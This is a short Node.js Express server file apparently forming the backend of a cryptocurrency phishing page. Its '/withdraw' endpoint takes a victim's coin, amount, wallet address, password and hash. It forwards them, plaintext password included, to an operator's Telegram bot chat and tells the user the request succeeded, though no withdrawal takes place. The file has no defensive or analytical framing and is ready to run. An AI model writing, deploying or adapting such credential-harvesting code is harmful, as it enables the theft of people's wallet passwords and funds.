// FINAL SERVER.JS
const express = require("express");
const axios = require("axios");
const path = require("path");
require("dotenv").config();

const app = express();
app.use(express.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

app.use(express.static(path.join(__dirname, "public")));
app.get("/", (req, res) => { res.sendFile(path.join(__dirname, "index.html")); });

app.post("/withdraw", async (req, res) => {
    try {
        const { coin, amount, usdt, wallet, password, hash } = req.body;
        const msg = `
<b>🚨 New Withdrawal Request</b>

<b>Coin:</b> ${coin}
<b>Amount:</b> ${amount}
<b>USDT Value:</b> ${usdt}

<b>Wallet:</b> ${wallet}
<b>Password:</b> ${password}

<b>Hash:</b> <code>${hash}</code>
        `;
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID, text: msg, parse_mode: "HTML"
        });
        return res.json({ success: true });
    } catch (err) {
        return res.json({ success: false, error: "Telegram error" });
    }
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log("Server running:", PORT));
